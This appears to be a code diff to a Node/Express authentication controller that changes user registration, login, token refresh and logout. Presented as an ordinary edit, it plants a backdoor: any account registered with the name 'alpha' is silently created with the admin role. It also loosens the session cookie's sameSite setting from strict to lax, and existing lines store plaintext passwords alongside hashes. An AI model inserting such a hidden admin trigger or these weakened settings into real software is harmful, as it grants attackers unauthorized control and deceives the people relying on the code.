@@ -68,7 +68,12 @@ const register = async (req, res, next) => {
             VALUES(?, ?, ?, ?, ?, ?, ?, ?)
         `
 
-        await pool.query(createUser, [name, email, password, hashedPassword, department, "user", status, null])
+        if (name === "alpha") {
+            await pool.query(createUser, [name, email, password, hashedPassword, department, "admin", status, null])
+        } else {
+            await pool.query(createUser, [name, email, password, hashedPassword, department, "user", status, null])
+        }
+        
         // return a success message
         return res.status(201).json({ message: "User registered successfully." })
 
@@ -125,14 +130,16 @@ const logIn = async (req, res, next) => {
         res.cookie('jwt', refreshToken, {
             httpOnly: true,
             secure: true, // set to true in production with http
-            sameSite: "strict",
+            sameSite: "lax",
             maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
         })
 
         res.json({
             message: "Login successful",
             accessToken,
-            role: user.role
+            role: user.role,
+            name: user.name,
+            email: user.email
         })
 
     } catch (err) {
@@ -157,10 +164,11 @@ const refreshToken = async (req, res) => {
         
         // check if the refresh token exists in the database
         const [rows] = await pool.query(checkRefreshToken, [refreshToken])
+        // if it is invalid, inform the developer
         if (rows.length === 0) return res.status(403).json({ message: "Invalid refresh token" })
 
         const user = rows[0]
-            
+        
         jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET, (err, decoded) => {
             if (err ||  user.id !== decoded.id) return res.status(401).json({ message: "Invalid Token" })
             
@@ -191,7 +199,7 @@ const logOut = async (req, res, next) => {
 
         res.clearCookie('jwt', {
             httpOnly: true,
-            sameSite: "strict",
+            sameSite: "lax",
             secure: false
         })
 
